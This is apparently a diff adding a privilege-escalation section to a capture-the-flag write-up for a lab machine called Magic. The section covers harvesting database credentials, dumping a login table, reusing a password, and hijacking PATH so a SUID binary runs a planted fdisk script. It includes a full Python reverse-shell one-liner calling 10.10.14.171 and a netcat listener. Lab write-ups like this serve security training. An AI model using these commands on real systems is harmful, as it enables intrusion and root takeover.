@@ -168,4 +168,128 @@ export TERM=xterm
 Unfortunately, we're running as the web daemon user www-data and we don't have privileges to view the user.txt flag. Therefore, we need to escalate our privileges.
 
 
+### Privilege Escalation
+
+Going through the web app files, we find database credentials in the db.php5 file.
+
+```
+www-data@ubuntu:/var/www/Magic$ cat db.php5
+...
+private static $dbName = 'Magic' ;
+private static $dbHost = 'localhost' ;
+private static $dbUsername = 'theseus';
+private static $dbUserPassword = 'iamkingtheseus';
+...
+```
+
+Let's check if theseus is a user on the system.
+
+```
+www-data@ubuntu:/var/www/Magic$ cat /etc/passwd
+...
+theseus:x:1000:1000:Theseus,,,:/home/theseus:/bin/bash
+...
+```
+
+He is. Let's see if he reused his database credentials for his system account.
+
+```
+www-data@ubuntu:/var/www/Magic$ su theseus
+Password: 
+su: Authentication failure
+```
+
+Doesn't work. The next thing to try is logging into the database with the credentials we found.
+![](/linux-boxes/magic/images/14.png)
+
+We can see that mysqldump is installed on the box, which we'll use to dump the database. 
+
+```
+www-data@ubuntu:/usr/bin$ mysqldump --databases Magic -utheseus -piamkingtheseus
+...
+--
+-- Dumping data for table `login`
+--
+LOCK TABLES `login` WRITE;
+/*!40000 ALTER TABLE `login` DISABLE KEYS */;
+INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
+...
+```
+
+Try the credentials we found on the theseus account. 
+
+```
+www-data@ubuntu:/usr/bin$ su theseus   
+Password: 
+theseus@ubuntu:/usr/bin$
+```
+
+We're in! View the user.txt flag.
+![](/linux-boxes/magic/images/15.png)
+
+Now we need to escalate our privileges to root. I downloaded the LinEnum script and ran it. It looks like the SUID bit is set for the sysinfo program, which means that the program runs with the privileges of the owner of the file, which is root.
+
+```
+/bin/sysinfo
+```
+
+Let's run strings on the program to see what it's doing.
+
+```
+theseus@ubuntu:/usr/include/x86_64-linux-gnu/sys$ strings /bin/sysinfo
+...
+====================Hardware Info====================
+lshw -short
+====================Disk Info====================
+fdisk -l
+...
+```
+
+We can see that it runs the fdisk & lshw programs without specifying the full path. Therefore, we could abuse that to our advantage and have it instead run a malicious fdisk program that we control.
+
+In the tmp folder (which we have write access to), create an fdisk file and add a python reverse shell to it.
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.171",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+Give it execute rights.
+
+```
+chmod +x fdisk
+```
+
+Set the path directory to include the tmp directory.
+
+```
+PATH=/tmp:$PATH
+```
+
+This way when we run the sysinfo program, it'll look for the fdisk program in the tmp directory and execute our reverse shell.
+
+Setup a netcat listener to receive the reverse shell.
+
+```
+nc -nlvp 7777
+```
+
+Then run the sysinfo command.
+
+```
+sysinfo
+```
+
+We get a shell!
+![](/linux-boxes/magic/images/16.png)
+
+Upgrade the shell and get the root.txt flag.
+
+![](/linux-boxes/magic/images/17.png)
+
+## Automated Scripts
+
+This section automates the web application attack vector(s) of the box. I've written the code in such a way that it should be easily read, therefore, I won't go into explaining it here.
+
+The script automates the initial foothold vector for this box and can be found here. Refer to the Usage Instructions in the main method for instructions on how to run the script.
+
+![](/linux-boxes/magic/images/18.png)
 
